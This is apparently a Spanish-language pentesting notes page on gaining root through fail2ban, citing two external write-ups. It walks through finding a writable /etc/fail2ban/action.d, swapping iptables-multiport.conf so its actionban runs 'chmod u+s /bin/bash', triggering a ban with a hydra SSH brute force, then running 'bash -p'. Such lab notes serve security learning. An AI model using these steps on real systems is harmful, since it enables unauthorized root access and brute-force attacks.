---
icon: ban
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# File2ban Privilege Escalation

URL = https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49

o

URL = https://hackmd.io/@tahaafarooq/privilege-escalation-fail2ban

Se puede hacer de las 2 manera como proporcione en las 2 `URL's` por lo que se podria hacer lo siguiente...

```shell
id
```

Si con esto vemos que estamos en el grupo llamado `Security` y al hacer `sudo -l` podemos ejecutar como `root` el siguiente comando...

```
(root) NOPASSWD: /etc/init.d/fail2ban restart
```

Lo que podremos es reiniciar el servicio de `fail2ban` que su funcion es que cuando detecta que se esta utilizando multiples intentos de `login` o fuerza bruta te banean y en la linea de la configuracion del programa cuando pasa eso hay un comando en concreto estipulado para cuando pasa eso que es el cual cambiaremos para aprovecharlo...

```shell
find /etc -writable -ls 2>/dev/null
```

Haciendo eso veremos que podemos escribir y editar cosas dentro del siguiente directorio...

```
drwxrwx---   2 root    security    /etc/fail2ban/action.d
```

Dentro de este directorio se encuentra un archivo llamado `iptables-multiport.conf` que es el que controla cuando se banea a una persona que comando se ejecuta, por lo que lo editaremos de la siguiente manera...

```shell
mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.bak
```

```shell
cp /etc/fail2ban/action.d/iptables-multiport.bak /etc/fail2ban/action.d/iptables-multiport.conf
```

Y con esto podremos editarlo ya que anteriormente esta con permisos de `root` y no nos dejaba editarlo hacemos este `Bypass` moviendolo con otra extension, por lo que ya estara en nuestro grupo y podremos editarlo, despues lo copiamos para que se quede como estaba asi pudiendo editarlo y que lo detecte el programa cuando se ejecute...

```shell
nano /etc/fail2ban/action.d/iptables-multiport.conf

#Dentro del nano donde pone 'actionban = ' y el contendio del comando, lo cambiaremos por una inyeccion de coidigo malicioso que nos permita ser root
actionban = chmod u+s /bin/bash

^X
<Y or S>
<ENTER>
```

Con esto los cambios se habrian guardado y con esto hacemos que cuando nos baneen se ejecute ese `chmod`, por lo que haremos lo siguiente...

```shell
hydra -l <USERNAME> -P <WORDLIST> ssh://<IP>/ -t 64
```

Echo esto nos banearan y ya tendremos el comando ejecutado volviendo a la maquina victima...

Por lo que haremos...

```shell
bash -p
```

Y ya seriamos `root`...
